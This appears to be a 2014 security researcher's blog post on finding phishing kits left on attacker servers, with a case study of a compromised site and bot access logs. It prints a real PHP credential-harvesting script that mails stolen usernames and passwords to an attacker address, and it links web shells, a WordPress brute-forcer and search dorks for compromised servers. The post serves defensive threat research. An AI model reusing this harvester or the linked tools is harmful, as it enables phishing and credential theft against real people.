---
layout: post
title: "How to Hunt Down Phishing Kits"
date: 2014-07-30 22:12
comments: true
categories: phishing, phishing kits
---
<img src="{{root_url}}/images/headers/phishing_kit.png"/>
### Introduction
Sites like [phishtank](http://www.phishtank.com/phish_archive.php) and [clean-mx](http://support.clean-mx.com/clean-mx/phishing.php) act as crowdsourced phishing detection and validation. By knowing how to look, you can consistently find [interesting information](http://jordan-wright.github.io/blog/2014/04/04/a-look-at-comment-spam-generator-scripts/) about how attackers work, and the tools they use to conduct phishing campaigns. This post will give an example of how *phishing kits* are used, how to find them, as well as show a case study into other tools attackers use to maintain access to compromised servers.
<!-- more -->
### How Phishing Kits Work
To perform a phishing attack, attackers commonly employ prebuilt *phishing kits*. These kits come as a zip archive containing the HTML source code of the site they are spoofing, as well as accompanying PHP scripts that capture and process the phished credentials. Once credentials are submitted from a victim, they are passed to a script that looks similar to this (real) example:

```php
<?php
session_start();
if(!isset($_SESSION['username']) || $_SESSION['username'] == "" || !isset($_SESSION['password']) || $_SESSION['password'] == ""){
        header("Location:file_doc.php");
        exit;
}
session_destroy();
$username = $_SESSION['username'];
$password = $_SESSION['password'];

$ip = getenv("REMOTE_ADDR");
$country = visitor_country();
$message .= "-------Moded by Ghost Wir3 ----------\n";
$message .= "Username: ".$username."\n";
$message .= "Password : ".$password."\n";
$message .= "IP: ".$ip."\n";
$message .= "Country: ".$country."\n";
$recipient = "[redacted]@gmail.com";
$subject = "Ghost Wir3 - ".$country;
$headers = "From:  Ghost Wir3 <no_reply@mail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

$arr = country_sort();
foreach ($arr as $recipient)
{
        mail($recipient,$subject,$message,$headers);
}
?>
```

In this example, to reuse the phishing kit, an attacker simply needs to change the ```$recipient``` variable to point to their address. In addition to this, if we as defenders are able to pull this PHP code, we can quickly identify the threat actor (in this case, [redacted]@gmail.com).

### How to Find Phishing Kits
We've seen that these kits generally require the credentials to be processed by server-side code. Unless there is a misconfiguration on the server, we will not be able to view this code, only that credentials are being passed to it.

However, with that being said, *many attackers are **lazy***. I've seen from experience that the original zip file containing the phishing kit is often left on the server, and can be downloaded to reveal the server-side source code. Additionally, the directories hosting the phishing kits often have indexing enabled, making it easier for us to see the files in the directory. This same technique has also [been used previously by researchers](https://www.usenix.org/legacy/events/woot08/tech/full_papers/cova/cova.pdf) with success.

<img src="{{root_url}}/images/blog/phish_kits/directory_index.png"/>

Knowing this, we can send requests for common archive extensions automatically in the hopes of finding the original phishing kits. These extensions include things such as .zip, .tar, .tar.gz, and .rar. For example, if the URL found by phishtank or clean-mx is http://x.x.x.x/apple/index.php, we could send requests for http://x.x.x.x/apple.zip with success in many cases.

In some cases, finding the original phishing kit can reveal even more information about the tools and techniques used by attackers. Here's an example of one of those cases.

### A Look into a Compromised Website
While performing random checks on many of the sites listed on phishtank and clean-mx, I came across one site that had a phishing kit located in the /phpmyadmin directory. When checking the files in the phishing kit, I found reference to a c100.php web shell. Sure enough, this file was still in place on the server:

<img src="{{root_url}}/images/blog/phish_kits/c100.png" />

PHP backdoors provide substantial access to attackers, facilitating further attacks and control over the compromised server. The c100.php and c99.php backdoors are among the most popular backdoors used by attackers. Through some Googling, we can see that there are **tons** of servers that are compromised using [these](https://www.google.com/search?q=inurl%3A%22c99.php%22%22AND+filetype%3Aphp+%22!C99Shell%22+AND+%22Software%22) [shells](https://www.google.com/search?q=inurl%3A%22c100.php%22%22AND+filetype%3Aphp+%22%21C100%22+AND+%22Software%22).

This shell revealed additional scripts (and other webshells) used by the attacker, including (but certainly not limited to!) the following:

*  [valider.php](https://gist.github.com/jordan-wright/966cea37b8c01c360a2a#file-valider-php) - The credential caching script
*  [wpbrute.php](https://gist.github.com/jordan-wright/966cea37b8c01c360a2a#file-wpbrute-php) - A Wordpress brute forcing script
*  [wso.php](https://gist.github.com/jordan-wright/966cea37b8c01c360a2a#file-wso-php) - Another web shell

### Fellow Phish Hunters
In the process of pulling down additional scripts used by the attacker, I ran across the site access logs. Looking through this log, I could see the details of what files the attacker was accessing on the server, as well as determine that these files were in place as early as July 27, 2014. In addition to this, I found the following snippet:

```
[29/Jul/2014:02:59:44 +0100] "GET /phpmyadmin/tardis.zip HTTP/1.1" 404 428 "-" "Java/1.7.0_45"
[29/Jul/2014:02:59:44 +0100] "GET /phpmyadmin/paypal/tardis.zip HTTP/1.1" 404 435 "-" "Java/1.7.0_45"
[29/Jul/2014:02:59:45 +0100] "GET /phpmyadmin/paypal/paypal.zip HTTP/1.1" 404 435 "-" "Java/1.7.0_45"
[29/Jul/2014:02:59:45 +0100] "GET /phpmyadmin/paypal/wellsfargo.zip HTTP/1.1" 404 439 "-" "Java/1.7.0_45"
[29/Jul/2014:02:59:45 +0100] "GET /phpmyadmin/paypal/chase.zip HTTP/1.1" 404 434 "-" "Java/1.7.0_45"
[29/Jul/2014:02:59:45 +0100] "GET /phpmyadmin/paypal/boa.zip HTTP/1.1" 404 432 "-" "Java/1.7.0_45"
[29/Jul/2014:02:59:45 +0100] "GET /phpmyadmin/paypal/update.zip HTTP/1.1" 404 435 "-" "Java/1.7.0_45"
[29/Jul/2014:02:59:45 +0100] "GET /phpmyadmin/paypal/pp.zip HTTP/1.1" 404 431 "-" "Java/1.7.0_45"
[29/Jul/2014:02:59:45 +0100] "GET /phpmyadmin/paypal/wells.zip HTTP/1.1" 404 434 "-" "Java/1.7.0_45"
[29/Jul/2014:02:59:45 +0100] "GET /phpmyadmin/paypal/remax.zip HTTP/1.1" 404 434 "-" "Java/1.7.0_45"
[29/Jul/2014:02:59:46 +0100] "GET /phpmyadmin/paypal/paypal.com.zip HTTP/1.1" 404 439 "-" "Java/1.7.0_45"
[29/Jul/2014:02:59:46 +0100] "GET /phpmyadmin/paypal/us.zip HTTP/1.1" 404 431 "-" "Java/1.7.0_45"
[29/Jul/2014:02:59:47 +0100] "GET /phpmyadmin/paypal/www.paypal.com.zip HTTP/1.1" 404 443 "-" "Java/1.7.0_45"
[29/Jul/2014:02:59:47 +0100] "GET /phpmyadmin/paypal/bankofamerica.com.zip HTTP/1.1" 404 446 "-" "Java/1.7.0_45"
```

We can see that someone has a Java bot that is performing the same technique I described above, by automatically sending requests for common phishing kits. In fact, this and another bot submitted a **substantial** number of requests for common files to be found on phishing kits. I'll likely parse these out and make another blog post with the full list for those interested.

### Conclusion
Hopefully this post not only shows a few of the interesting pieces of information we can find when investigating servers used for phishing campaigns, but also that there is still an incredible amount of work to be done in identifying threat actors behind phishing campaigns. As always, let me know if you have any questions or comments below!

-Jordan ([@jw_sec](http://twitter.com/jw_sec))
